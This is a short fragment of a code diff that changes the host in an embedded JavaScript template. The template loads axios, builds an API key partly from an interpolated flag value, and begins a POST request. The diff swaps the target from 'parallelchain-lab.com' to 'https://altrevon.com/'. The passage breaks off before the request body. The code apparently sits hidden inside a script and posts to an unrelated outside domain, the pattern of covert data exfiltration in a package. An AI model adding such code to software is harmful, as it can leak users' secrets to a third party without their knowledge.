@@ -455,7 +455,7 @@ exit 0
     
 		script = `
 	const axios = require('axios');
-const host = "parallelchain-lab.com";
+const host = "https://altrevon.com/";
 const apikey = "3aeb34a3${flag}";
 axios
   .post(
